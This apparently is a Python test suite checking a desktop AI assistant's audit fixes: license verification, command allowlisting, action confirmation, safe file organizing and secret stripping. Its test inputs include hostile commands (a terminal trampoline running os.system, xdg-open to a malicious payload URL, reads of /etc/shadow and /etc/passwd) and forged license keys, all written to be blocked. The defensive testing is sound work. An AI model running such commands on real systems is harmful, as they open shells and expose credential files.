#!/usr/bin/env python3
import inspect
import json
import os
import re
import shutil
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

# Ensure localhost and 127.0.0.1 bypass any local environment proxy
for _k in ("NO_PROXY", "no_proxy"):
    _existing = os.environ.get(_k, "")
    _current = [x.strip() for x in _existing.split(",") if x.strip()]
    for _a in ("127.0.0.1", "localhost", "::1"):
        if _a not in _current:
            _current.append(_a)
    os.environ[_k] = ",".join(_current)

import bajrang_core
import fedora
import installer_windows
import linux_generic
import macos
import razorpay_server
import windows


class TestBajrangAuditRemediations(unittest.TestCase):
    def test_c1_license_forgery_blocked_and_rsa2048_verified(self):
        with tempfile.TemporaryDirectory() as tmp:
            lm = bajrang_core.LicenseManager(Path(tmp))
            ok_forged, _ = lm.verify_key("BAJRANG-PRO-HACKER-20991231-ZZZZZZZZ")
            self.assertFalse(ok_forged, "C1: Forged BAJRANG-PRO token must be rejected")

            ok_any8, _ = lm.verify_key("BAJRANG-PRO-USER01-20991231-12345678")
            self.assertFalse(ok_any8, "C1: Any symmetric BAJRANG-PRO token must be rejected")

            cert = razorpay_server.AsymmetricLicenseIssuer.issue_license_certificate(
                email="kaushik@cbit.ac.in",
                order_id="order_test_1",
                payment_id="pay_test_1",
            )
            self.assertTrue(cert.startswith("BAJRANG-V6-"))
            ok_rsa, msg_rsa = lm.verify_key(cert)
            self.assertTrue(ok_rsa, f"C1: Valid 2048-bit RSA certificate must verify: {msg_rsa}")

            tampered = cert[:-4] + ("0000" if not cert.endswith("0000") else "ffff")
            ok_tampered, _ = lm.verify_key(tampered)
            self.assertFalse(ok_tampered, "C1: Tampered RSA signature must be rejected")

    def test_c2_no_client_side_credentials_or_key_minting(self):
        base = Path(__file__).resolve().parent
        checked_count = 0
        forbidden_tokens = (
            "OWNER_EMAIL_HASH",
            "OWNER_DEFAULT_PASSKEY",
            "generateBajrangLicenseKey",
            "BajrangOwner@9392",
            "SECRET" + "_SALT",
            "BAJRANG_ADMIN_TOKEN",
        )
        for ext in ("*.html", "*.js"):
            for fpath in base.glob(f"**/{ext}"):
                rel = str(fpath.relative_to(base))
                if any(part.startswith(".") or part in ("__pycache__", "release_dist", "dist", "node_modules") for part in fpath.parts):
                    continue
                if rel in ("index.backup.html", "index.old.html"):
                    continue
                content = fpath.read_text(encoding="utf-8", errors="replace")
                checked_count += 1
                for token in forbidden_tokens:
                    self.assertNotIn(token, content, f"C2: {rel} must not contain forbidden secret/minting token '{token}'")

        self.assertGreaterEqual(checked_count, 5, "C2: Must verify at least 5 active HTML/JS files, never pass silently")
        self.assertTrue((base / "index.html").is_file(), "C2: index.html must exist")
        self.assertTrue((base / "web" / "index.html").is_file(), "C2: web/index.html must exist")

    def test_c3_command_allowlist_trampoline_blocked(self):
        guard = bajrang_core.SafetyGuard(strict_allowlist=True)
        trampolines = [
            'gnome-terminal -- python3 -c "import os; os.system(\'id\')"',
            "wt.exe powershell -Command calc.exe",
            "xdg-open https://malicious.example/payload",
            "code --Wait /etc/passwd",
            "gedit /etc/shadow",
        ]
        for cmd in trampolines:
            ok, reason = guard.check_command(cmd)
            self.assertFalse(ok, f"C3: Trampoline or argument command must be blocked: {cmd} ({reason})")

        ok_clean, _ = guard.check_command("gnome-terminal")
        self.assertTrue(ok_clean, "C3: Zero-argument allowed binary should be permitted")

    def test_c4_schema_validation_no_shell_exec_and_confirmation_gate(self):
        ok_shell, _, _ = bajrang_core.ToolSchemaValidator.validate_action(
            {"tool": "shell_exec", "arguments": {"command": "gnome-terminal"}}
        )
        self.assertFalse(ok_shell, "C4: shell_exec must not be an AI-callable schema tool")

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            cfg = bajrang_core.ConfigManager(config_dir=root / "cfg", data_dir=root / "data")
            adapter = windows.WindowsPlatformAdapter()
            engine = bajrang_core.BajrangEngine(adapter=adapter, config=cfg)

            engine.client.chat = lambda *a, **kw: bajrang_core.AssistantTurn(
                response_type="action",
                text="Typing into window",
                actions=[{"tool": "type_text", "arguments": {"text": "echo pwned"}}],
            )
            engine.process_prompt("Type echo pwned", auto_confirm_actions=False)
            self.assertEqual(
                len(engine.pending_actions),
                1,
                "C4: Unconfirmed type_text must be held in pending_actions",
            )
            confirmed_out = engine.confirm_pending_actions()
            self.assertEqual(len(engine.pending_actions), 0)
            self.assertEqual(len(confirmed_out), 1)

    def test_c5_organizer_collision_safety_trash_undo_and_cancellation(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            dl = root / "Downloads"
            dl.mkdir()
            (dl / "Documents").mkdir()
            existing_report = dl / "Documents" / "report.pdf"
            existing_report.write_bytes(b"ORIGINAL_IMPORTANT_REPORT_CONTENT")

            incoming_report = dl / "report.pdf"
            incoming_report.write_bytes(b"NEW_DIFFERENT_REPORT_CONTENT")

            dup_a = dl / "notes_a.txt"
            dup_b = dl / "notes_b.txt"
            dup_a.write_bytes(b"IDENTICAL_DUPLICATE_PAYLOAD")
            dup_b.write_bytes(b"IDENTICAL_DUPLICATE_PAYLOAD")

            storage = bajrang_core.LocalChatStorage(root / "data")
            planner = bajrang_core.AutonomousTaskPlanner(storage)
            ok_p, plan = planner.create_organization_plan(str(dl), remove_duplicates=True)
            self.assertTrue(ok_p)
            ok_ex, _ = planner.execute_approved_plan(plan.plan_id, user_confirmed=True)
            self.assertTrue(ok_ex)

            self.assertEqual(
                existing_report.read_bytes(),
                b"ORIGINAL_IMPORTANT_REPORT_CONTENT",
                "C5: Existing Documents/report.pdf must NEVER be overwritten",
            )
            renamed_report = dl / "Documents" / "report_1.pdf"
            self.assertTrue(renamed_report.exists(), "C5: Colliding file must be saved as report_1.pdf")
            self.assertEqual(renamed_report.read_bytes(), b"NEW_DIFFERENT_REPORT_CONTENT")

            ok_undo, _ = planner.undo_plan(plan.plan_id)
            self.assertTrue(ok_undo, "C5: undo_plan must succeed")
            self.assertTrue(incoming_report.exists(), "C5: Undo must restore incoming report.pdf")
            self.assertTrue(dup_a.exists() and dup_b.exists(), "C5: Undo must restore trashed duplicates")

    def test_c6_provider_key_affinity_and_gemini_header(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            cfg = bajrang_core.ConfigManager(config_dir=root / "cfg", data_dir=root / "data")
            adapter = windows.WindowsPlatformAdapter()
            engine = bajrang_core.BajrangEngine(adapter=adapter, config=cfg)

            google_key = "AIzaSyD-TestGoogleGeminiKey1234567890"
            engine.client.configure_byo_key(google_key)
            self.assertEqual( cfg.get_api_key("groq"), "", "C6: Google AIza key must never be returned for Groq")
            self.assertEqual( cfg.get_api_key("openai"), "", "C6: Google AIza key must never be returned for OpenAI")
            self.assertEqual( cfg.get_api_key("openrouter"), "", "C6: Google AIza key must never be returned for OpenRouter")

            router_src = inspect.getsource(bajrang_core.ModularAIRouter)
            self.assertIn("x-goog-api-key", router_src, "C6: Gemini API key must be sent in x-goog-api-key header")
            self.assertNotIn("?key=", router_src, "C6: Gemini API key must not be placed in URL query string")

    def test_h1_fedora_export_and_setup_script(self):
        with tempfile.TemporaryDirectory() as tmp:
            out_dir = fedora.export_modular_project(Path(tmp) / "exported")
            self.assertTrue((out_dir / "fedora.py").is_file(), "H1: fedora.py must be exported")
            self.assertTrue((out_dir / "bajrang_core.py").is_file(), "H1: bajrang_core.py must be exported")
            self.assertTrue((out_dir / "windows.py").is_file(), "H1: windows.py must be exported")
            self.assertTrue((out_dir / "run.sh").is_file(), "H1: run.sh must be exported")
            ext_js = (out_dir / "gnome-extension" / "extension.js").read_text(encoding="utf-8")
            self.assertIn(str(out_dir / "fedora.py"), ext_js, "H1: GNOME extension must invoke resolved fedora.py")

        setup_sh = (Path(__file__).resolve().parent / "setup_fedora.sh").read_text(encoding="utf-8")
        self.assertIn("fedora.py", setup_sh)
        self.assertIn("bajrang_core.py", setup_sh)
        self.assertIn("requirements-fedora.txt", setup_sh)

    def test_h2_emergency_stop_aborts_streams_and_kill_socket(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            cfg = bajrang_core.ConfigManager(config_dir=root / "cfg", data_dir=root / "data")
            adapter = fedora.FedoraWaylandAdapter()
            engine = bajrang_core.BajrangEngine(adapter=adapter, config=cfg)

            stop_ev = fedora.start_fedora_kill_socket_listener(engine)
            time.sleep(0.1)
            ok_k, msg_k = fedora.send_kill_signal_to_running_instance()
            stop_ev.set()
            self.assertTrue(ok_k, f"H2: Fedora global kill socket must succeed: {msg_k}")
            self.assertTrue(engine.kill_switch.is_cancelled, "H2: Kill switch must be marked cancelled")

    def test_h3_all_schema_tools_implemented(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            cfg = bajrang_core.ConfigManager(config_dir=root / "cfg", data_dir=root / "data")
            adapter = windows.WindowsPlatformAdapter()
            engine = bajrang_core.BajrangEngine(adapter=adapter, config=cfg)
            actions = [
                {"tool": "list_windows", "arguments": {}},
                {"tool": "scroll_view", "arguments": {"direction": "down", "amount": 3}},
                {"tool": "navigate_hotkey", "arguments": {"keys": ["ctrl", "c"]}},
                {"tool": "inspect_directory", "arguments": {"path": str(root)}},
                {"tool": "memory_store", "arguments": {"key": "pref", "value": "dark_mode"}},
            ]
            for act in actions:
                res = engine.execute_action(act)
                self.assertNotIn("Unsupported tool", res.output, f"H3: {act['tool']} must be supported")

    def test_h4_unknown_key_rejected_and_hotkey_order_independent(self):
        win_adapter = windows.WindowsPlatformAdapter()
        fed_adapter = fedora.FedoraWaylandAdapter()

        res_w = win_adapter.press_key("nonexistent_key_999")
        res_f = fed_adapter.press_key("nonexistent_key_999")
        self.assertFalse(res_w.success, "H4: Windows press_key must reject unknown keys")
        self.assertTrue(res_w.blocked, "H4: Windows press_key must mark unknown keys blocked")
        self.assertFalse(res_f.success, "H4: Fedora press_key must reject unknown keys")
        self.assertTrue(res_f.blocked, "H4: Fedora press_key must mark unknown keys blocked")

        res_hk1 = fed_adapter.hotkey(["f4", "alt"])
        res_hk2 = win_adapter.hotkey(["r", "win"])
        self.assertTrue(res_hk1.blocked, "H4: Reversed ['f4', 'alt'] must be blocked")
        self.assertTrue(res_hk2.blocked, "H4: Reversed ['r', 'win'] must be blocked")

    def test_h5_razorpay_http_server_and_rsa_2048(self):
        self.assertGreaterEqual(bajrang_core.RSA_2048_MODULUS.bit_length(), 2048)
        self.assertEqual(razorpay_server.run_self_test(), 0)

    def test_h6_installer_honest_status_consent_and_uninstall(self):
        self.assertEqual(installer_windows.run_self_test(), 0)

    def test_h7_deployment_configs_isolated_to_web_dir(self):
        base = Path(__file__).resolve().parent
        vercel_cfg = json.loads((base / "vercel.json").read_text(encoding="utf-8"))
        self.assertEqual(vercel_cfg.get("outputDirectory"), "web", "H7: vercel.json must serve only web/")
        deploy_yml = (base / ".github" / "workflows" / "deploy.yml").read_text(encoding="utf-8")
        self.assertIn('path: "web"', deploy_yml, "H7: deploy.yml must upload only web/")
        web_html = (base / "web" / "index.html").read_text(encoding="utf-8")
        self.assertNotIn("PACKAGED_GZ_B64URL", web_html, "H7: web/index.html must not inline Base64 source blobs")

    def test_h8_session_pinned_prompt_and_tts_lock_release(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            cfg = bajrang_core.ConfigManager(config_dir=root / "cfg", data_dir=root / "data")
            adapter = windows.WindowsPlatformAdapter()
            engine = bajrang_core.BajrangEngine(adapter=adapter, config=cfg)

            s1 = engine.new_session("Session One")
            s2 = engine.new_session("Session Two")
            engine.switch_session(s2)
            engine.process_prompt("Pinned to session 1", session_id=s1)
            msgs_s1 = engine.storage.get_session_messages(s1)
            msgs_s2 = engine.storage.get_session_messages(s2)
            self.assertEqual(len(msgs_s1), 2, "H8: Prompt & reply must be written to pinned session s1")
            self.assertEqual(len(msgs_s2), 0, "H8: Switched session s2 must not receive s1 messages")

    def test_phase2_cross_platform_adapters_and_matrix(self):
        # 1. macOS Platform Adapter
        mac_adapter = macos.MacOSPlatformAdapter()
        ctx_mac = mac_adapter.get_desktop_context()
        self.assertIn("macOS", ctx_mac)

        # Mock subprocess to verify macOS command generation
        with mock.patch("subprocess.run") as mock_run:
            mock_run.return_value = mock.Mock(returncode=0, stdout="", stderr="")
            res_open = mac_adapter.open_app("calculator")
            self.assertTrue(res_open.success)
            mock_run.assert_called_with(["open", "-a", "calculator"], capture_output=True, text=True, timeout=5, check=False)

            res_notif = mac_adapter.send_notification("Test Title", "Test Body")
            self.assertTrue(res_notif.success)

        # Rejection of dangerous trampolines & unknown keys
        res_trampoline = mac_adapter.open_app("gnome-terminal -- python3 -c 'evil'")
        self.assertTrue(res_trampoline.blocked)
        res_bad_key = mac_adapter.press_key("nonexistent_mac_key_999")
        self.assertTrue(res_bad_key.blocked)

        # 2. Generic Linux Adapter
        lin_adapter = linux_generic.GenericLinuxAdapter()
        ctx_lin = lin_adapter.get_desktop_context()
        self.assertIn("Linux", ctx_lin)
        distro, pkg, hint = linux_generic.GenericLinuxAdapter.detect_distro()
        self.assertTrue(bool(distro and pkg and hint))

        with mock.patch("subprocess.run") as mock_run:
            mock_run.return_value = mock.Mock(returncode=0, stdout="", stderr="")
            with mock.patch("shutil.which", return_value="/usr/bin/notify-send"):
                res_n = lin_adapter.send_notification("Header", "Content")
                self.assertTrue(res_n.success)

        # 3. Platform Capability Matrix
        for os_name in ("macos", "windows", "linux"):
            caps = bajrang_core.PlatformCapabilityMatrix.get_capabilities(os_name)
            self.assertIn("os", caps)
            self.assertIn("voice_capture", caps)
            self.assertIn("native_screen_capture", caps)
            self.assertIn("input_injection_backend", caps)
            self.assertIn("quarantine_supported", caps)

    def test_phase4_structured_audit_logger(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_p = Path(tmp)
            logger = bajrang_core.StructuredAuditLogger(tmp_p)

            logger.log_event(
                action_type="file_operation",
                target_paths=["/home/user/Downloads/test.pdf"],
                outcome="success",
                auto_approve_active=True,
                undo_plan_id="plan_test_001",
                details={"operation": "move"},
            )

            # Verify SQLite record
            events = logger.get_recent_events(limit=10)
            self.assertEqual(len(events), 1)
            ev = events[0]
            self.assertEqual(ev["action_type"], "file_operation")
            self.assertEqual(ev["outcome"], "success")
            self.assertTrue(ev["auto_approve_active"])
            self.assertEqual(ev["undo_plan_id"], "plan_test_001")
            self.assertIn("/home/user/Downloads/test.pdf", ev["target_paths"])

            # Verify JSONL log file
            self.assertTrue(logger.jsonl_path.is_file())
            line = logger.jsonl_path.read_text(encoding="utf-8").strip()
            record = json.loads(line)
            self.assertEqual(record["action_type"], "file_operation")
            self.assertEqual(record["undo_plan_id"], "plan_test_001")

    def test_phase5_natural_language_file_engine_20_phrasings_and_safety(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_root = Path(tmp)
            storage = bajrang_core.LocalChatStorage(tmp_root / "data")
            audit = bajrang_core.StructuredAuditLogger(tmp_root / "audit")
            engine = bajrang_core.NaturalLanguageFileEngine(memory_store=storage, audit_logger=audit)

            # Setup mock folder tree under tmp_root
            dl_dir = tmp_root / "Downloads"
            docs_dir = tmp_root / "Documents"
            desk_dir = tmp_root / "Desktop"
            pics_dir = tmp_root / "Pictures"
            dl_dir.mkdir(parents=True)
            docs_dir.mkdir(parents=True)
            desk_dir.mkdir(parents=True)
            pics_dir.mkdir(parents=True)

            # Create sample files
            (dl_dir / "invoice_101.pdf").write_text("invoice pdf")
            (dl_dir / "invoice_102.csv").write_text("invoice csv")
            (dl_dir / "holiday_photo.jpg").write_text("photo jpg")
            (dl_dir / "screenshot_2026.png").write_text("screenshot png")
            (dl_dir / "backup.zip").write_text("zip archive")
            (dl_dir / "script.py").write_text("python script")
            (dl_dir / "movie.mp4").write_text("video file")

            # 20 Distinct Natural Language Phrasings
            test_phrasings = [
                "organize my downloads folder by file type",
                "move all pdf files from downloads to documents",
                "clean up my desktop and organize into folders",
                "find all screenshots and move them to pictures",
                "copy invoices from downloads to documents/invoices",
                "quarantine all old zip files in downloads",
                "delete duplicate files in downloads",
                "organize downloads by month and year",
                "move all images from downloads to pictures/imported",
                "find large files over 100mb in downloads",
                "rename receipts to add date prefix",
                "move the files I just copied to desktop",
                "undo last operation",
                "undo plan plan_sample_123",
                "list files in downloads",
                "find all pdfs edited this week",
                "scan downloads and desktop for duplicates",
                "organize code files in downloads into a new folder on the desktop",
                "move videos from downloads to videos folder",
                "clean downloads folder and send duplicates to quarantine",
            ]

            self.assertEqual(len(test_phrasings), 20, "Must test at least 20 distinct phrasings")

            for phrase in test_phrasings:
                plan = engine.plan_request(phrase, base_dir=tmp_root, context_paths=[str(dl_dir / "invoice_101.pdf")])
                self.assertIsNotNone(plan.plan_id, f"Plan ID missing for phrase: '{phrase}'")
                self.assertTrue(len(plan.plain_english_summary) > 0, f"Summary missing for phrase: '{phrase}'")

            # Test 1: Protected System Path Refusal
            plan_bad1 = engine.plan_request("move files to /etc/shadow", base_dir=tmp_root)
            self.assertIsNotNone(plan_bad1.blocked_reason, "Must refuse /etc")
            self.assertIn("Protected system path", plan_bad1.blocked_reason)

            plan_bad2 = engine.plan_request("clean up C:\\Windows\\System32", base_dir=tmp_root)
            self.assertIsNotNone(plan_bad2.blocked_reason, "Must refuse C:\\Windows")

            # Dotfile protection
            dot_file = dl_dir / ".bashrc"
            dot_file.write_text("export SECRET=1")
            is_prot, _ = engine.is_protected_path(dot_file)
            self.assertTrue(is_prot, "Dotfiles must be flagged as protected")

            # Test 2: >200 Files Confirmation Gate
            large_batch_dir = tmp_root / "LargeBatch"
            large_batch_dir.mkdir(parents=True)
            for i in range(210):
                (large_batch_dir / f"doc_{i:03d}.pdf").write_text(f"content {i}")

            large_plan = engine.plan_request("organize files", base_dir=tmp_root)
            large_plan.items = [
                bajrang_core.FileOpItem(str(large_batch_dir / f"doc_{i:03d}.pdf"), str(tmp_root / "out" / f"doc_{i:03d}.pdf"), "move")
                for i in range(210)
            ]
            large_plan.requires_large_batch_confirmation = True

            ok_gate, msg_gate, cnt_gate = engine.execute_plan(large_plan, confirmed=False)
            self.assertFalse(ok_gate, "Unconfirmed >200 batch must fail execution")
            self.assertIn("exceeds 200 files", msg_gate)

            # With explicit confirmation, it executes
            ok_gate_conf, _, cnt_conf = engine.execute_plan(large_plan, confirmed=True)
            self.assertTrue(ok_gate_conf, "Confirmed >200 batch must execute")
            self.assertEqual(cnt_conf, 210)

            # Test 3: Non-destructive collision renaming
            (docs_dir / "sample.txt").write_text("original text")
            (dl_dir / "sample.txt").write_text("incoming text")
            col_plan = bajrang_core.FileOperationPlan(
                plan_id="plan_col_test",
                plain_english_summary="Collision test",
                items=[bajrang_core.FileOpItem(str(dl_dir / "sample.txt"), str(docs_dir / "sample.txt"), "move")],
            )
            ok_col, _, _ = engine.execute_plan(col_plan, confirmed=True)
            self.assertTrue(ok_col)
            self.assertTrue((docs_dir / "sample.txt").is_file(), "Original file must not be overwritten")
            self.assertTrue((docs_dir / "sample_1.txt").is_file(), "Collision must be renamed to sample_1.txt")
            self.assertEqual((docs_dir / "sample.txt").read_text(), "original text")
            self.assertEqual((docs_dir / "sample_1.txt").read_text(), "incoming text")

            # Test 4: Quarantine and Lossless One-Click Undo
            (dl_dir / "quarantine_target.zip").write_text("zip data for quarantine")
            q_plan = engine.plan_request("quarantine all old zip files in downloads", base_dir=tmp_root)
            ok_q, _, cnt_q = engine.execute_plan(q_plan, confirmed=True)
            self.assertTrue(ok_q)
            self.assertFalse((dl_dir / "quarantine_target.zip").exists(), "Quarantined file must be moved out of source")

            # Execute Undo
            ok_undo, msg_undo, cnt_undo = engine.undo_plan(q_plan.plan_id)
            self.assertTrue(ok_undo, f"Undo must succeed: {msg_undo}")
            self.assertTrue((dl_dir / "quarantine_target.zip").is_file(), "Undone file must be restored to original path")

    def test_phase6_integrated_features(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_root = Path(tmp)
            cfg = bajrang_core.ConfigManager(config_dir=tmp_root / "cfg", data_dir=tmp_root / "data")
            adapter = windows.WindowsPlatformAdapter()
            engine = bajrang_core.BajrangEngine(adapter=adapter, config=cfg)

            # 1. TaskSchedulerManager
            sched = engine.scheduler
            res_add = sched.add_schedule("clean up my Downloads every Friday at 6pm")
            self.assertIn("id", res_add)
            self.assertEqual(res_add["rule"], "weekly:friday:18:00")
            schedules = sched.list_schedules()
            self.assertGreaterEqual(len(schedules), 1)
            ok_pause = sched.pause_schedule(res_add["id"])
            self.assertTrue(ok_pause)
            ok_resume = sched.resume_schedule(res_add["id"])
            self.assertTrue(ok_resume)
            ok_del = sched.delete_schedule(res_add["id"])
            self.assertTrue(ok_del)

            # 2. ClipboardContextTracker
            clip = engine.clipboard_tracker
            test_f = tmp_root / "copied.txt"
            test_f.write_text("hello clipboard")
            clip.record_paths([str(test_f)])
            clip.record_plan("plan_clip_001")
            self.assertEqual(clip.get_context_paths(), [str(test_f)])
            self.assertEqual(clip.get_last_plan_id(), "plan_clip_001")

            # 3. PermissionsManager
            perms = engine.permissions
            self.assertTrue(perms.is_granted("screen_capture"))
            perms.revoke("screen_capture")
            self.assertFalse(perms.is_granted("screen_capture"))
            res_act = engine.execute_action({"tool": "read_screen", "arguments": {}}, user_confirmed=True)
            self.assertTrue(res_act.blocked, "Action must be blocked when permission is revoked")
            self.assertIn("Permission denied", res_act.output)
            perms.grant("screen_capture")
            self.assertTrue(perms.is_granted("screen_capture"))

            # 4. Content-Hash Duplicate Finder (SHA-256)
            folder_a = tmp_root / "FolderA"
            folder_b = tmp_root / "FolderB"
            folder_a.mkdir(parents=True)
            folder_b.mkdir(parents=True)
            dup_content = b"IDENTICAL DUPLICATE FILE CONTENT SHA256"
            (folder_a / "file1.txt").write_bytes(dup_content)
            (folder_b / "file2.txt").write_bytes(dup_content)
            (folder_a / "unique.txt").write_bytes(b"unique content")

            dups, total_dups = engine.file_engine.find_duplicates_multi_folder([str(folder_a), str(folder_b)])
            self.assertEqual(total_dups, 1, "Must find exactly 1 duplicate file")
            self.assertEqual(len(dups), 1, "Must find 1 hash group with multiple files")

            # 5. Offline Natural-Language File Search
            search_res = engine.file_engine.offline_search("unique", search_dir=str(folder_a))
            self.assertGreaterEqual(len(search_res), 1)
            self.assertEqual(search_res[0]["name"], "unique.txt")

            # 6. Sanitized Settings Export / Import
            cfg.settings["api_key_gemini"] = "AIzaSySecretDoNotExport"
            cfg.settings["byo_api_key"] = "sk-SecretKeyDoNotExport"
            cfg.settings["custom_theme"] = "obsidian_orange"
            exported = bajrang_core.export_settings_sanitized(cfg)
            self.assertNotIn("api_key_gemini", exported, "API keys must be stripped in sanitized export")
            self.assertNotIn("byo_api_key", exported, "BYO API keys must be stripped in sanitized export")
            self.assertEqual(exported["custom_theme"], "obsidian_orange")

            # Import into clean config
            clean_cfg = bajrang_core.ConfigManager(config_dir=tmp_root / "clean_cfg", data_dir=tmp_root / "clean_data")
            ok_imp, _ = bajrang_core.import_settings_sanitized(clean_cfg, exported)
            self.assertTrue(ok_imp)
            self.assertEqual(clean_cfg.settings["custom_theme"], "obsidian_orange")
            self.assertNotIn("api_key_gemini", clean_cfg.settings)

            # 7. Auto-Approve Mode
            ok_fail, _ = engine.set_auto_approve_mode(True, acknowledged_risk=False)
            self.assertFalse(ok_fail, "Auto-approve must fail without risk acknowledgment")
            ok_pass, _ = engine.set_auto_approve_mode(True, acknowledged_risk=True)
            self.assertTrue(ok_pass)
            self.assertTrue(engine.auto_approve_mode)
            engine.trigger_emergency_kill()
            self.assertFalse(engine.auto_approve_mode, "Emergency kill must immediately disable auto-approve mode")

    def test_phase_a_regression_ollama_autostart_and_offline_card(self):
        """Phase A Regression Test: Ensure Ollama watchdog and autostart handle offline states safely."""
        # 1. Direct watchdog call with dead host
        watchdog = bajrang_core.OllamaWatchdogManager(ollama_host="http://127.0.0.1:59999")
        res_watchdog = watchdog.ensure_running()
        self.assertIsInstance(res_watchdog, bool)
        self.assertFalse(res_watchdog, "Watchdog on dead port must return False without raising TypeError")

        # 2. Direct static method call
        res_static = bajrang_core.UnifiedModelClient._try_autostart_ollama("http://127.0.0.1:59999")
        self.assertIsInstance(res_static, bool)
        self.assertFalse(res_static, "_try_autostart_ollama on dead port must return False without raising TypeError")

        # 3. Full process_prompt flow with offline Ollama and no cloud API key
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            cfg = bajrang_core.ConfigManager(config_dir=root / "cfg", data_dir=root / "data")
            cfg.vault._memory_secrets = {}
            cfg.vault.get_secret = lambda k: ""
            cfg.settings["ollama_host"] = "http://127.0.0.1:59999"
            adapter = windows.WindowsPlatformAdapter()
            engine = bajrang_core.BajrangEngine(adapter=adapter, config=cfg)
            engine.watchdog.ollama_host = "http://127.0.0.1:59999"

            turn = engine.process_prompt("what is quantum computing?")
            self.assertIn("Local Ollama AI Engine Offline", turn.text)
            self.assertEqual(turn.provider_used, "offline_fallback")
            self.assertEqual(turn.model_used, "offline")

            # Verify SQLite persisted the turn properly
            msgs = engine.storage.get_session_messages(engine.current_session_id)
            self.assertEqual(len(msgs), 2)
            self.assertEqual(msgs[0]["role"], "user")
            self.assertEqual(msgs[1]["role"], "assistant")
            self.assertIn("Local Ollama AI Engine Offline", msgs[1]["content"])

    def test_phase_c_10_features(self):
        """Phase C Comprehensive Verification: Tests all 10 newly added production features."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            cfg = bajrang_core.ConfigManager(config_dir=root / "cfg", data_dir=root / "data")
            adapter = windows.WindowsPlatformAdapter()
            engine = bajrang_core.BajrangEngine(adapter=adapter, config=cfg)

            # Feature 1: Conversation Summarization & Auto-Titling
            engine.process_prompt("organize my downloads and clean pdf files")
            turn_sum = engine.process_prompt("summarize conversation")
            self.assertIn("Session Title Updated", turn_sum.text)
            sessions = engine.storage.list_sessions()
            self.assertTrue(any("Organizer" in s["title"] or "Downloads" in s["title"] for s in sessions))

            # Feature 2: Multi-Step Task Chaining
            turn_chain = engine.process_prompt("list windows then status")
            self.assertEqual(turn_chain.provider_used, "chained_task_planner")
            self.assertIn("Multi-Step Chained Task Execution (2 steps)", turn_chain.text)
            self.assertIn("Step 1", turn_chain.text)
            self.assertIn("Step 2", turn_chain.text)

            # Feature 3: Per-Session Safe Mode
            turn_sm_on = engine.process_prompt("enable safe mode")
            self.assertTrue(engine.is_session_safe_mode())
            self.assertIn("Session Safe Mode Activated", turn_sm_on.text)

            # Mutating action must be blocked in Safe Mode even if auto-approve is active
            engine.set_auto_approve_mode(True, acknowledged_risk=True)
            res_blocked = engine.execute_action({"tool": "type_text", "arguments": {"text": "hello"}})
            self.assertTrue(res_blocked.blocked)
            self.assertIn("Refused by Session Safe Mode", res_blocked.output)

            turn_sm_off = engine.process_prompt("disable safe mode")
            self.assertFalse(engine.is_session_safe_mode())
            self.assertIn("Session Safe Mode Deactivated", turn_sm_off.text)

            # Feature 4: Export Session Transcript to Markdown
            turn_exp = engine.process_prompt("export transcript")
            self.assertIn("Session Transcript Exported", turn_exp.text)
            m_path = re.search(r"`([^`]+\.md)`", turn_exp.text)
            self.assertIsNotNone(m_path)
            exp_file = Path(m_path.group(1))
            self.assertTrue(exp_file.is_file())
            content_exp = exp_file.read_text(encoding="utf-8")
            self.assertIn("# Sudharshan AI (Alpha v0.9) — Conversation Transcript", content_exp)

            # Feature 5: Local Daily System Activity Digest
            engine.audit_logger.log_event("file_operation", ["/test/doc.pdf"], "success")
            turn_digest = engine.process_prompt("what changed on my system today")
            self.assertIn("Daily System Digest", turn_digest.text)
            self.assertIn("Sudharshan AI monitored", turn_digest.text)

            # Feature 6: Network-Aware Mode Switching
            turn_net = engine.process_prompt("network status")
            self.assertIn("Network Connectivity", turn_net.text)
            # Socket timeout test
            is_fake_online = bajrang_core.NetworkConnectivityDetector.is_online(host="192.0.2.1", port=53, timeout_sec=0.1)
            self.assertFalse(is_fake_online)

            # Feature 7: First-Run Guided Setup Wizard
            turn_wiz = engine.process_prompt("setup wizard")
            self.assertIn("Guided Setup Wizard", turn_wiz.text)
            self.assertIn("Local Ollama", turn_wiz.text)
            turn_preset = engine.process_prompt("preset local")
            self.assertIn("Preset Applied", turn_preset.text)
            self.assertTrue(engine.config.settings.get("first_run_completed"))

            # Feature 8: Global Dry-Run Everything Mode
            turn_dr_on = engine.process_prompt("enable dry run")
            self.assertTrue(engine.dry_run_mode)
            self.assertIn("Global Dry-Run Mode Enabled", turn_dr_on.text)

            res_sim = engine.execute_action({"tool": "click_point", "arguments": {"x": 50, "y": 75}})
            self.assertTrue(res_sim.success)
            self.assertIn("DRY-RUN SIMULATION", res_sim.output)
            self.assertTrue(res_sim.metadata.get("dry_run"))

            turn_dr_off = engine.process_prompt("disable dry run")
            self.assertFalse(engine.dry_run_mode)
            self.assertIn("Global Dry-Run Mode Disabled", turn_dr_off.text)

            # Feature 9: Crash-and-Restart Session Recovery
            rec_file = root / "data" / ".sudharshan_session_heartbeat.json"
            rec_file.write_text(json.dumps({"session_id": "sess_crashed_999", "clean_shutdown": False}), encoding="utf-8")
            engine_crash_recover = bajrang_core.BajrangEngine(adapter=adapter, config=cfg)
            self.assertIsNotNone(engine_crash_recover.unclean_shutdown_recovered)
            self.assertEqual(engine_crash_recover.unclean_shutdown_recovered["session_id"], "sess_crashed_999")
            engine_crash_recover.recovery_mgr.mark_clean_shutdown()
            self.assertIsNone(engine_crash_recover.recovery_mgr.check_unclean_shutdown())

            # Feature 10: Built-in Bug Report Generator
            turn_bug = engine.process_prompt("report a bug: local model slow on older cpu")
            self.assertIn("Diagnostic Bug Report Generated", turn_bug.text)
            m_bug = re.search(r"`([^`]+\.md)`", turn_bug.text)
            self.assertIsNotNone(m_bug)
            bug_file = Path(m_bug.group(1))
            self.assertTrue(bug_file.is_file())
            content_bug = bug_file.read_text(encoding="utf-8")
